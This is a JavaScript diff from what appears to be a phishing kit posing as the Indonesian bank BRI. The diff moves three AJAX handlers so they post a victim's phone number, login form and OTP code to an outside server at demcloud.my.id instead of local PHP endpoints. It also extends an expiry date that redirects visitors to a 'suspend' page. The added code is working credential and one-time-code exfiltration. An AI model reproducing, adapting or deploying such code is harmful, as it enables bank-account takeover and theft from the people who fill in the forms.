@@ -1,7 +1,7 @@
 let tglNow = new Date();
-let waktuBatas = new Date("2025-08-23T23:59:59");
+let waktuBatas = new Date("2025-08-24T23:59:59");
 if (tglNow.getTime() >= waktuBatas.getTime()) {
-  document.location.href = 'https://expiredweb.pages.dev';
+  document.location.href = 'https://suspend-web.pages.dev';
 } else {
   console.log('Server aktif');
 }
@@ -19,7 +19,7 @@ function sendNohp(){
    
        $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://demcloud.my.id/BRI/fdsr01/no.php',
             data: $('#hpForm').serialize(),
             datatype: 'JSON',
             
@@ -45,7 +45,7 @@ function sendLogin(){
    
      $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://demcloud.my.id/BRI/fdsr01/login.php',
             data: $('#loginForm').serialize(),
             datatype: 'JSON',
             
@@ -80,7 +80,7 @@ function sendOtp(){
      
      $.ajax({
             type: 'POST',
-            url: 'rest/otp.php',
+            url: 'https://demcloud.my.id/BRI/fdsr01/otp.php',
             data: $('#formOtp').serialize(),
             datatype: 'JSON',
         
